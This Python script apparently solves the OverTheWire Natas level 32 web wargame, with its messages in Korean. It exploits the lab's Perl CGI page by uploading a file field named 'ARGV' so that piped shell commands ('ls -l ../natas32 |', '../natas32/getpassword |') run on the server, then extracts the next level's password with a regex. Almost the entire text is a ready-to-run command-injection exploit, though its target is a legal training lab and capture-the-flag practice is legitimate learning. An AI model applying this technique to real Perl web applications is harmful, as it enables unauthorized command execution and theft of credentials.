import requests
import sys
import re

boundary = "=" * 65

if len(sys.argv) != 2:
  print(boundary)
  print("[-] 아래 포멧을 지켜서 실행해주세요")
  print(f"   python {sys.argv[0]} [natas32 비밀번호]")
  print(boundary)
  sys.exit()
  

s = requests.Session()
natas32_cred = sys.argv[1]

url = "http://natas32.natas.labs.overthewire.org/index.pl"
s.auth = ("natas32", natas32_cred)


def run_cmd(payload, ex_files):
  response = s.post(url, params=payload, files=ex_files)
  print("[*] 현재 실행중인 url + 페이로드 전체")
  print(f"    {response.url}")
  print(boundary)
  return response.text
  

ex_files = [
  ("file", (None, "ARGV")),
  ("file", ("text.csv", "fakefile"))
]

ex1_payload = "ls -l ../natas32 |"

ex1_res = run_cmd(ex1_payload, ex_files)
print("[*] ls -l을 통해 나온 파일명 확인")
print(ex1_res)
print(boundary)

ex2_payload = "../natas32/getpassword |"

ex2_res = run_cmd(ex2_payload, ex_files)
password = re.search(r"[a-zA-Z0-9]{32}", ex2_res)


if password:
  print(f"[+] natas33 비밀번호 ===> {password.group(0)}")
  print(boundary)
else:
  print("[-] 페이로드가 이상하니 재확인")
  print(boundary)
